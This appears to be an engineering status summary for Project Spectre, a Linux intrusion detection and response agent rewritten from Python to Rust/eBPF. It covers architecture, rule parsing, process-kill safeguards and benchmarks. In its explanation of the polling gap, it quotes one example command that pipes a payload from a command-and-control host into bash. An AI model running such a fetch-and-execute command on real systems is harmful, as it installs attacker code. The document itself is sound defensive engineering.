# Project Spectre: Technical Summary & Engineering Status

## 1. Executive Summary

Project Spectre is a Host-based Intrusion Detection and Active Response System (HIDS/EDR). This document provides an engineering summary of the system, detailing the architectural transition from the V1 experimental Python prototype to the V2 production Rust/eBPF engine, backed by empirical benchmarks and verified implementation facts.

---

## 2. System Status & Implementation Reality

| Attribute | Spectre V1 (Prototype) | Spectre V2 (Current Engine) |
|---|---|---|
| **Status** | Historical Reference / Educational PoC | Active High-Performance Engine (`spectre-v2-rewrite`) |
| **Language & Runtime** | Python 3.8+ (CPython interpreter) | Rust (stable 1.70+) + C (eBPF bytecode via Clang) |
| **Telemetry Mechanism** | User-space polling via `psutil` (500ms intervals) | Kernel tracepoint `sys_enter_execve` via eBPF |
| **Event Buffering** | In-process Python queues | In-kernel BPF Ring Buffer (`BPF_MAP_TYPE_RINGBUF`, 4 MB) |
| **Command-Line Retrieval** | `/proc/<pid>/cmdline` (TOCTOU race vulnerability) | User-space `argv` pointers walked in kernel space (`bpf_probe_read_user_str`) |
| **Process Keying** | Raw PID (`u32`), vulnerable to PID recycling collisions | Generational `ProcessKey { pid: u32, start_time_ns: u64 }` |
| **Rule Condition Parsing** | 3-token whitespace splitter (`split_whitespace()`) | Top-Down Operator Precedence (Pratt) AST parser |
| **Rule Spec Support** | Basic equality and substring checks | Boolean algebra (`AND`, `OR`, `NOT`, `(...)`), sequence lists (`OR`), `\|all` (`AND`), CIDR (`ipnet`), regex cache |
| **Graph Modeling** | `networkx.DiGraph` with linear sweeps | `petgraph::stable_graph::StableDiGraph` with min-heap lazy GC |
| **Graph Eviction Complexity** | $O(\|V\| + \|E\|)$ linear scans locking main loop | $O(K \log M)$ min-heap lazy eviction queue (256-node slice budget) |
| **Containment Mechanism** | Unprotected `kill(pid, sig)` | Top-down `SIGSTOP` freeze, bottom-up `SIGKILL`, `pidfd_send_signal` race protection |
| **Safety Invariants** | Unenforced | PID $\le 2$, self PID, parent PID, and system daemon protection |
| **Resident Memory (RSS)** | 65 – 180 MB | **4.8 MB** (measured via `ps -o rss`) |
| **Single-Thread Throughput** | ~200 – 500 evals/sec | **2,557,939 AST evals/sec** (0.39 µs per evaluation) |
| **Executable Footprint** | Multi-file Python package | **4.8 MB** static ELF binary (`spectre-agent`) |
| **Test Verification** | 35 Python unit/integration tests | 15 Rust workspace unit, integration, and benchmark tests |

---

## 3. The Need for V2: Why User-Space Polling Failed

During initial testing of the V1 prototype, three critical structural vulnerabilities were identified:

1. **The Polling Window (TOCTOU Gap)**:
   Any process executed with a lifetime shorter than the polling interval (e.g., `curl http://c2.internal/stage2 | bash`) can spawn, execute, exfiltrate or download payloads, and terminate without ever appearing in `psutil.process_iter()`.
2. **Command-Line Spoofing & Tampering**:
   Reading `/proc/<pid>/cmdline` from user space is subject to time-of-check to time-of-use races. Malicious binaries can overwrite their own `argv` memory (`prctl(PR_SET_NAME)` or rewriting `argv[0]`) immediately after starting.
3. **PID Reuse Collisions**:
   On high-load systems (e.g., CI runners, container hosts), Linux rapidly recycles process IDs. Indexing graph nodes by raw integer PID causes distinct processes separated by minutes to merge into a single erroneous node, destroying ancestry fidelity.

---

## 4. Spectre V2 Verified Subsystem Architecture

### 4.1 In-Kernel eBPF Telemetry (`v2/ebpf-c/src/sensor.c`)
* Hooks `tracepoint/syscalls/sys_enter_execve`.
* Extracts PID, TGID, start timestamp (`bpf_ktime_get_ns()`), and PPID (`task_struct->real_parent->tgid`).
* Safely walks up to 16 `argv` user-space pointers using `bpf_probe_read_user()` and `bpf_probe_read_user_str()`.
* Packs arguments as null-delimited strings directly into memory reserved via `bpf_ringbuf_reserve()`.
* Allocates zero telemetry memory on the 512-byte eBPF kernel stack.
* Commits events atomically to a 4MB kernel ring buffer (`BPF_MAP_TYPE_RINGBUF`).

### 4.2 Standardized Binary Envelope (`v2/ebpf-c/include/telemetry_events.h`)
* Shared 48-byte aligned `telemetry_header` struct across C and Rust (`#[repr(C)]`).
* Multiplexes `FORK`, `EXEC`, `EXIT`, `FILE_OPEN`, and `NET_CONNECT` over a single unified stream.

### 4.3 Pratt AST Sigma Rule Engine (`v2/spectre-rules`)
* Implements Top-Down Operator Precedence parsing for condition expressions:
  - Correct operator precedence: `NOT` (highest) > `AND` > `OR`.
  - Full support for arbitrary nested parentheses `(...)`.
  - Cardinality expressions: `1 of them`, `all of them`, `1 of pattern_*`.
* Sigma specification conformance:
  - Sequence value lists evaluate as boolean `OR` by default.
  - Modifier chaining: `|all` converts sequence lists to boolean `AND`.
  - CIDR matching for IPv4/IPv6 networks using `ipnet::IpNet`.
  - Regular expressions are pre-compiled into `Arc<Regex>` at rule load time, eliminating regex compilation on event ingestion paths.

### 4.4 Generational Process Graph (`v2/spectre-graph`)
* Primary storage: `petgraph::stable_graph::StableDiGraph`.
* Primary key: `ProcessKey { pid: u32, start_time_ns: u64 }`, eliminating PID reuse collisions.
* Ancestry traversals: Non-recursive, cycle-safe BFS traversal (`get_ancestors()`) capped at 16 hops.
* Eviction mechanism: Lazy min-heap priority queue (`BinaryHeap<Reverse<EvictionEntry>>`).
* Decoupled GC: Background Tokio task running every 2 seconds evicts up to 256 expired nodes per slice. Write lock hold duration is measured at under 30 µs.

### 4.5 Active Mitigation Subsystem (`v2/spectre-agent/src/mitigation.rs`)
* Safety guards prevent sending signals to PID 1 (`init`/`systemd`), PID 2 (`kthreadd`), the agent's own PID, parent PID, and system daemons (`systemd`, `dbus-daemon`, `sshd`, `systemd-udevd`).
* Target processes are signaled via `pidfd_open` and `pidfd_send_signal` system calls to prevent PID-recycling race conditions.
* Two-phase containment:
  - **Phase 1**: Traverses process tree top-down, issuing `SIGSTOP` to freeze all execution and prevent further forks.
  - **Phase 2**: Traverses tree bottom-up (post-order), issuing `SIGKILL` so leaves exit before parents, eliminating orphaned processes.
* Optional cgroup v2 freezer via `cgroup.freeze`.

---

## 5. Empirical Performance Verification

All measurements were taken on Linux x86_64 with compiled release binaries:

| Test / Metric | Measured Result | Benchmark Code / Tool |
|---|---|---|
| **Sigma AST Evaluation Throughput** | **2,557,939 evals/sec** | `v2/spectre-rules/tests/benchmark_eval.rs` (100,000 runs) |
| **Sigma AST Evaluation Latency** | **0.39 µs per evaluation** | Calculated from benchmark duration (39.09 ms for 100k evals) |
| **Agent Resident Set Size (RSS)** | **4.8 MB** | `ps -o rss` during live ingestion |
| **Static Release Executable Size** | **4.8 MB** | `ls -lh v2/target/release/spectre-agent` |
| **Graph Eviction Lock Latency** | **< 30 µs** | 256-node slice budget on `BinaryHeap` |
| **Workspace Test Suite** | **15 passed, 0 failed (100%)** | `cargo test --workspace --manifest-path=v2/Cargo.toml` in < 0.6s |

---

## 6. Current Limitations & Scope

To maintain engineering transparency, the current operational boundaries of Spectre V2 are documented below:

1. **Kernel Compatibility**:
   Requires Linux kernel version >= 5.8 for BPF Ring Buffer support, and BTF (BPF Type Format) enabled in the kernel config (`CONFIG_DEBUG_INFO_BTF=y`).
2. **Active Tracepoints in eBPF**:
   The C sensor currently hooks `sys_enter_execve`. The multiplexed envelope formats for `FORK`, `EXIT`, `FILE_OPEN`, and `NET_CONNECT` are defined and tested in userspace, but their corresponding kernel tracepoints (`sched_process_fork`, `sched_process_exit`, `sys_enter_openat`, `security_socket_connect`) are scheduled for subsequent hook implementations.
3. **Execution Privileges**:
   Running the live eBPF sensor requires root privileges (`CAP_BPF`, `CAP_PERFMON`, or `CAP_SYS_ADMIN`). For unprivileged environments, the agent provides an integrated mock engine (`--mock`) that exercises the entire userspace graph, rule evaluation, and mitigation pipeline.